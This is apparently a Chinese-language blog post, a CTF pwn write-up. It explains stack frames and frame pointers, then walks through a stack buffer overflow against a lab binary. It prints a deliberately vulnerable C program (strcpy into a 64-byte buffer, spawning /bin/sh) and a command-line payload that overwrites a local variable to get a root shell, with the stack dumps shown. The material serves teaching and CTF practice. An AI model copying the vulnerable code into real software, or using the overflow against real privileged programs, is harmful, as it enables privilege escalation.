+<p>堆栈是一块保存数据的连续内存。 一个名为堆栈指针(SP)的寄存器指向堆栈的顶部。 堆栈的底部在一个固定的地址。 堆栈的大小在运行时由内核动态地调整。 CPU实现指令 PUSH和POP， 向堆栈中添加元素和从中移去元素。 堆栈由逻辑堆栈帧组成。 当调用函数时逻辑堆栈帧被压入栈中， 当函数返回时逻辑 堆栈帧被从栈中弹出。 堆栈帧包括函数的参数， 函数的局部变量， 以及恢复前一个堆栈 帧所需要的数据， 其中包括在函数调用时指令指针(IP)的值。 堆栈既可以向下增长(向内存低地址)也可以向上增长， 这依赖于具体的实现。 在我 们的例子中， 堆栈是向下增长的。 这是很多计算机的实现方式， 包括Intel， Motorola， SPARC和MIPS处理器。 堆栈指针(SP)也是依赖于具体实现的。 它可以指向堆栈的最后地址， 或者指向堆栈之后的下一个空闲可用地址。 在我们的讨论当中， SP指向堆栈的最后地址。 除了堆栈指针(SP指向堆栈顶部的的低地址)之外， 为了使用方便还有指向帧内固定 地址的指针叫做帧指针(FP)。 有些文章把它叫做局部基指针(LB-local base pointer)。 从理论上来说， 局部变量可以用SP加偏移量来引用。 然而， 当有字被压栈和出栈后， 这 些偏移量就变了。 尽管在某些情况下编译器能够跟踪栈中的字操作， 由此可以修正偏移 量， 但是在某些情况下不能。 而且在所有情况下， 要引入可观的管理开销。 而且在有些 机器上， 比如Intel处理器， 由SP加偏移量访问一个变量需要多条指令才能实现。 因此， 许多编译器使用第二个寄存器， FP， 对于局部变量和函数参数都可以引用， 因为它们到FP的距离不会受到PUSH和POP操作的影响。 在Intel CPU中， BP(EBP)用于这 个目的。 在Motorola CPU中， 除了A7(堆栈指针SP)之外的任何地址寄存器都可以做FP。 考虑到我们堆栈的增长方向， 从FP的位置开始计算， 函数参数的偏移量是正值， 而局部 变量的偏移量是负值。 当一个例程被调用时所必须做的第一件事是保存前一个FP(这样当例程退出时就可以 恢复)。 然后它把SP复制到FP， 创建新的FP， 把SP向前移动为局部变量保留空间。 这称为 例程的序幕(prolog)工作。 当例程退出时， 堆栈必须被清除干净， 这称为例程的收尾 (epilog)工作。 Intel的ENTER和LEAVE指令， Motorola的LINK和UNLINK指令， 都可以用于 有效地序幕和收尾工作。</p>
+<p><strong>步骤1：</strong> 程序源代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">(<span class="keyword">int</span> tmp, <span class="keyword">char</span> *str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> win = tmp;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, str);</span><br><span class="line">    dump_stack((<span class="keyword">void</span> **) buf, <span class="number">23</span>, (<span class="keyword">void</span> **) &amp;tmp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;win = %d\n&quot;</span>, win);</span><br><span class="line">    <span class="keyword">if</span> (win == <span class="number">1</span>) &#123;</span><br><span class="line">        execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Sorry, you lose.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: stack_overwrite [str]\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">uid_t</span> euid = geteuid();</span><br><span class="line">    setresuid(euid, euid, euid);</span><br><span class="line">    vuln(<span class="number">0</span>, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤2：</strong> 首先，我们打开平台，点击操作机，点击通过web ssh登录进入控制台。</p>
+<p><strong>步骤3：</strong> 我们输入ls，查看当前文件夹下有三个文件，我们尝试cat flag，发现权限缺失，所以我们尝试利用overflow1-3948d17028101c40的漏洞进行攻击。</p>
+<p><strong>步骤4：</strong> 首先，我们的输入是程序的命令行参数。第二，如果我们可以设置win变量等于1，我们会得到一个shell！ 让我们进行cat flag。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ ./overflow1-3948d17028101c40 $(python -c &#x27;print &quot;A&quot;*64 + &quot;B&quot;&#x27;)</span><br><span class="line">Stack dump:</span><br><span class="line">0xffa81994: 0xffa82845 (second argument)</span><br><span class="line">0xffa81990: 0x00000000 (first argument)</span><br><span class="line">0xffa8198c: 0x0804870f (saved eip)</span><br><span class="line">0xffa81988: 0xffa819b8 (saved ebp)</span><br><span class="line">0xffa81984: 0xf779c000</span><br><span class="line">0xffa81980: 0xf76a8a00</span><br><span class="line">0xffa8197c: 0x00000042</span><br><span class="line">0xffa81978: 0x41414141</span><br><span class="line">0xffa81974: 0x41414141</span><br><span class="line">0xffa81970: 0x41414141</span><br><span class="line">0xffa8196c: 0x41414141</span><br><span class="line">0xffa81968: 0x41414141</span><br><span class="line">0xffa81964: 0x41414141</span><br><span class="line">0xffa81960: 0x41414141</span><br><span class="line">0xffa8195c: 0x41414141</span><br><span class="line">0xffa81958: 0x41414141</span><br><span class="line">0xffa81954: 0x41414141</span><br><span class="line">0xffa81950: 0x41414141</span><br><span class="line">0xffa8194c: 0x41414141</span><br><span class="line">0xffa81948: 0x41414141</span><br><span class="line">0xffa81944: 0x41414141</span><br><span class="line">0xffa81940: 0x41414141</span><br><span class="line">0xffa8193c: 0x41414141 (beginning of buffer)</span><br><span class="line">win = 66</span><br><span class="line">Sorry, you lose.</span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤5：</strong> 你会看到，如果我们填满了缓冲区（“A”* 64）和一个”B”字母，win的值会改变。 对于那些不知道的人，“B”的ascii值是66，这意味着我们可以控制win变量。 我们所要做的就是提交一个ascii值为1的字符。由于这是不可打印的，我们将在python中使用转义序列。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ ./overflow1-3948d17028101c40 $(python -c &#x27;print &quot;A&quot;*64 + &quot;\x01&quot;&#x27;)</span><br><span class="line">Stack dump:</span><br><span class="line">0xff828874: 0xff829848 (second argument)</span><br><span class="line">0xff828870: 0x00000000 (first argument)</span><br><span class="line">0xff82886c: 0x0804870f (saved eip)</span><br><span class="line">0xff828868: 0xff828898 (saved ebp)</span><br><span class="line">0xff828864: 0xf77b7000</span><br><span class="line">0xff828860: 0xf76c3aa7</span><br><span class="line">0xff82885c: 0x00000001</span><br><span class="line">0xff828858: 0x41414141</span><br><span class="line">0xff828854: 0x41414141</span><br><span class="line">0xff828850: 0x41414141</span><br><span class="line">0xff82884c: 0x41414141</span><br><span class="line">0xff828848: 0x41414141</span><br><span class="line">0xff828844: 0x41414141</span><br><span class="line">0xff828840: 0x41414141</span><br><span class="line">0xff82883c: 0x41414141</span><br><span class="line">0xff828838: 0x41414141</span><br><span class="line">0xff828834: 0x41414141</span><br><span class="line">0xff828830: 0x41414141</span><br><span class="line">0xff82882c: 0x41414141</span><br><span class="line">0xff828828: 0x41414141</span><br><span class="line">0xff828824: 0x41414141</span><br><span class="line">0xff828820: 0x41414141</span><br><span class="line">0xff82881c: 0x41414141 (beginning of buffer)</span><br><span class="line">win = 1</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤6：</strong> 之后，我们输入id，发现我们已经拿到了root的权限。然后我们再cat flag，这次便成功获取到flag了。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/06/29/ctfpwn4/" rel="prev" title="">
+                  <i class="fa fa-chevron-left"></i> 
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/07/07/kali_1/" rel="next" title="">
+                   <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">FBC</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
